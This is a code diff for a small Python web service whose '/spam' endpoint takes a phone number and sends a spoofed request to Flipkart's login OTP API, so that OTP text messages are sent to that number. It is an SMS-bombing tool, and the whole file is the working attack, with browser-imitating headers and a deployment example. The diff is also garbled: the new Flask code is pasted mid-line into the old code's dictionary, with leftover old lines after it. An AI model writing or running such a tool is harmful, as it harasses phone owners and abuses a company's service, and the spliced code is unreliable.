@@ -1,43 +1,143 @@
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import requests
-import random
-import json
-import time
-from urllib.parse import parse_qs, urlparse
-from datetime import datetime
-
-class handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        # Parse URL path
-        parsed_path = urlparse(self.path)
-        path = parsed_path.path
-        
-        # Set response headers
-        self.send_response(200)
-        self.send_header('Content-type', 'application/json')
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.end_headers()
-        
-        # Check if path is /spam
-        if path != '/spam':
-            response = {
-                "success": False,
-                "error": "Invalid endpoint. Use /spam endpoint",
-                "example": "https://your-domain.vercel.app/spam?number=9876543210"
-            }
-            self.wfile.write(json.dumps(response, indent=2).encode())
-            return
-        
-        # Parse query parameters
-        query = parse_qs(parsed_path.query)
-        number = query.get('number', [None])[0]
-        
-        # Validate phone number
-        if not number or not number.isdigit() or len(number) != 10:
             response = {
                 "success": False,
                 "error": "Invalid phone number. Please provide 10 digits.",
-                "example": "https://your-domain.vercel.app/spam?number=9876543210"
+          from flask import Flask, request, jsonify
+import requests
+from datetime import datetime
+import os
+
+app = Flask(__name__)
+
+def send_flipkart_otp(phone_number):
+    """
+    Send OTP request to Flipkart API
+    """
+    url = "https://2.rome.api.flipkart.com/1/action/view"
+    
+    headers = {
+        "authority": "2.rome.api.flipkart.com",
+        "accept": "*/*",
+        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+        "content-type": "application/json",
+        "origin": "https://www.flipkart.com",
+        "referer": "https://www.flipkart.com/",
+        "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+        "x-user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 FKUA/msite/0.0.3/msite/Mobile"
+    }
+    
+    payload = {
+        "actionRequestContext": {
+            "type": "LOGIN_IDENTITY_VERIFY",
+            "loginIdPrefix": "+91",
+            "loginId": phone_number,
+            "clientQueryParamMap": {"ret": "/"},
+            "loginType": "MOBILE",
+            "verificationType": "OTP",
+            "screenName": "LOGIN_V4_MOBILE",
+            "sourceContext": "DEFAULT"
+        }
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code, response.json()
+    except Exception as e:
+        return None, {"error": str(e)}
+
+@app.route('/', methods=['GET'])
+def home():
+    return jsonify({
+        "status": "active",
+        "message": "Flipkart OTP API is running",
+        "usage": {
+            "method": "GET",
+            "url": "/spam?number=9876543210",
+            "example": "https://your-domain.vercel.app/spam?number=9876543210"
+        }
+    })
+
+@app.route('/spam', methods=['GET'])
+def send_otp():
+    """
+    API endpoint to send OTP using GET request
+    URL Pattern: /spam?number=9876543210
+    """
+    # Get phone number from query parameter
+    phone = request.args.get('number', '').strip()
+    
+    # Validate phone number
+    if not phone:
+        return jsonify({
+            "success": False,
+            "error": "Phone number is required",
+            "message": "Please provide number parameter",
+            "usage": "/spam?number=9876543210"
+        }), 400
+    
+    if not phone.isdigit() or len(phone) != 10:
+        return jsonify({
+            "success": False,
+            "error": "Invalid phone number",
+            "message": "Phone number must be 10 digits",
+            "provided": phone
+        }), 400
+    
+    # Send OTP request
+    status_code, response_data = send_flipkart_otp(phone)
+    
+    # Prepare response
+    result = {
+        "success": False,
+        "timestamp": datetime.now().isoformat(),
+        "phone": f"+91{phone}",
+        "message": "",
+        "details": {}
+    }
+    
+    if status_code == 200 and response_data.get("STATUS") == "SUCCESS":
+        result["success"] = True
+        result["message"] = "OTP sent successfully"
+        result["details"] = {
+            "status_code": status_code,
+            "flipkart_response": response_data
+        }
+        return jsonify(result), 200
+    elif status_code is not None:
+        result["message"] = f"Failed with status code: {status_code}"
+        result["details"] = {
+            "status_code": status_code,
+            "flipkart_response": response_data
+        }
+        return jsonify(result), status_code
+    else:
+        result["message"] = "Connection error"
+        result["details"] = {
+            "error": response_data.get("error")
+        }
+        return jsonify(result), 500
+
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({
+        "status": "healthy",
+        "timestamp": datetime.now().isoformat(),
+        "endpoints": {
+            "/": "GET - API info",
+            "/health": "GET - Health check",
+            "/spam?number=1234567890": "GET - Send OTP"
+        }
+    })
+
+# For local development
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=True)      "example": "https://your-domain.vercel.app/spam?number=9876543210"
             }
             self.wfile.write(json.dumps(response, indent=2).encode())
             return
